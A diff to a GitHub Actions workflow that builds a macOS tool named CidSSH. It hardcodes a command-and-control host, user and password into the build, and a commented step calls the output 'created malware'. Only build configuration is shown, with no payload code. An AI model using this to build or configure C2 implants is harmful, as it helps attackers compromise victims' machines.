@@ -6,10 +6,11 @@ on:
       types: # This configuration does not affect the page_build event above
         - created
 
-# Hardcode C2_IP and C2 SSH password so the CI builds everything for you
+# Hardcode C2_IP and C2 SSH password so the CI builds everything for you. Keep quotes
 env:
-  C2_IP: ""
-  PASSWORD_AUTH: ""
+  CID_C2_HOST: ""
+  CID_C2_USER: ""
+  CID_C2_PASSWORD: ""
 
 jobs:
     build:
@@ -17,18 +18,25 @@ jobs:
         runs-on: macos-latest
         steps:
             - uses: haya14busa/action-cond@v1
-              id: c2IPCondval
+              id: CidC2HostCondval
               with:
-                cond: "${{ env.C2_IP == '' }}"
+                cond: "${{ env.CID_C2_HOST == '' }}"
                 if_true: ""
-                if_false: "-DC2_IP=${{ env.C2_IP }}"
+                if_false: "-DCID_C2_HOST=\"${{ env.CID_C2_HOST }}\""
 
             - uses: haya14busa/action-cond@v1
-              id: passwordCondval
+              id: CidUserCondval
               with:
-                cond: "${{ env.PASSWORD_AUTH == '' }}"
+                cond: "${{ env.CID_C2_USER == '' }}"
                 if_true: ""
-                if_false: "-DPASSWORD_AUTH=${{ env.PASSWORD_AUTH }}"
+                if_false: "-DCID_C2_USER=\"${{ env.CID_C2_USER }}\""
+
+            - uses: haya14busa/action-cond@v1
+              id: CidPasswordCondval
+              with:
+                cond: "${{ env.CID_C2_PASSWORD == '' }}"
+                if_true: ""
+                if_false: "-DCID_C2_PASSWORD=\"${{ env.CID_C2_PASSWORD }}\""
               
             - uses: actions/checkout@v1
               with:
@@ -40,8 +48,13 @@ jobs:
             
             - name: Install libssh
               run: |
+                  cd $VCPKG_INSTALLATION_ROOT
+                  git reset --hard
+                  git pull
+                  ./bootstrap-vcpkg.sh
+
                   echo "set(VCPKG_BUILD_TYPE release)" >> $VCPKG_INSTALLATION_ROOT/triplets/x64-linux.cmake
-                  VCPKG_FORCE_SYSTEM_BINARIES=1 VCPKG_BUILD_TYPE=release vcpkg install libssh[core,openssl] --triplet x64-osx
+                  VCPKG_FORCE_SYSTEM_BINARIES=1 vcpkg install libssh[core,openssl] --triplet x64-osx
             
             - name: Create build directory
               run: |
@@ -49,14 +62,14 @@ jobs:
                   export CPPFLAGS="-I/usr/local/opt/openssl/include"
                   export PKG_CONFIG_PATH="/usr/local/opt/openssl/lib/pkgconfig"
                   cmake --version
-                  cmake -S . -B build -DWITH_WEBSOCKETS=OFF ${{ steps.c2IPCondval.outputs.value }} ${{ steps.passwordCondval.outputs.value }} -DCMAKE_TOOLCHAIN_FILE="/tmp/vcpkg/scripts/buildsystems/vcpkg.cmake" -DCMAKE_BUILD_TYPE=Release
+                  cmake -S . -B build -DWITH_WEBSOCKETS=OFF ${{ steps.CidC2HostCondval.outputs.value }} ${{ steps.CidUserCondval.outputs.value }} ${{ steps.CidPasswordCondval.outputs.value }} -DCMAKE_TOOLCHAIN_FILE="$VCPKG_INSTALLATION_ROOT/scripts/buildsystems/vcpkg.cmake" -DCMAKE_BUILD_TYPE=Release
             
             - name: Build CidSSH in SSH mode
               run: |
                   export LDFLAGS="-L/usr/local/opt/openssl/lib"
                   export CPPFLAGS="-I/usr/local/opt/openssl/include"
                   export PKG_CONFIG_PATH="/usr/local/opt/openssl/lib/pkgconfig"
-                  cmake --build build -j8
+                  cmake --build build --config Release
                   
             - name: Create build directory
               run: |
@@ -64,14 +77,14 @@ jobs:
                   export CPPFLAGS="-I/usr/local/opt/openssl/include"
                   export PKG_CONFIG_PATH="/usr/local/opt/openssl/lib/pkgconfig"
                   cmake --version
-                  cmake -S . -B build_ws -DWITH_WEBSOCKETS=ON -DCMAKE_TOOLCHAIN_FILE="/tmp/vcpkg/scripts/buildsystems/vcpkg.cmake" -DCMAKE_BUILD_TYPE=Release
+                  cmake -S . -B build_ws -DWITH_WEBSOCKETS=ON -DCMAKE_TOOLCHAIN_FILE="$VCPKG_INSTALLATION_ROOT/scripts/buildsystems/vcpkg.cmake" -DCMAKE_BUILD_TYPE=Release
             
             - name: Build CidSSH in Websocket mode
               run: |
                   export LDFLAGS="-L/usr/local/opt/openssl/lib"
                   export CPPFLAGS="-I/usr/local/opt/openssl/include"
                   export PKG_CONFIG_PATH="/usr/local/opt/openssl/lib/pkgconfig"
-                  cmake --build build_ws -j8
+                  cmake --build build_ws --config Release
             
             #- name: Strip symbols from created malware
             #  run: |
